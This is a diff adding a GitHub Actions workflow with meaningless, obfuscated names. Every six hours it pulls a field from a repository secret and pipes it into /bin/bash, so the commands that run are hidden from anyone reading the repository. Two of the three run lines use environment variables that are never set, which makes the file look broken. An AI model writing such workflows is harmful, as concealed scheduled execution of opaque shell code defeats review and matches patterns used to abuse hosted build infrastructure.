@@ -1,0 +1,19 @@
+name: zhongpingcui1234
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongpingcui1234
+        env:
+          c83: ${{ secrets.c83 }}
+        run: |
+          echo $c83 | jq -r .mh1048 | /bin/bash
+          echo $cqg7587 | jq -r .ebq737 | /bin/bash
+          echo $ppi82 | jq -r .ek35145 | /bin/bash
+
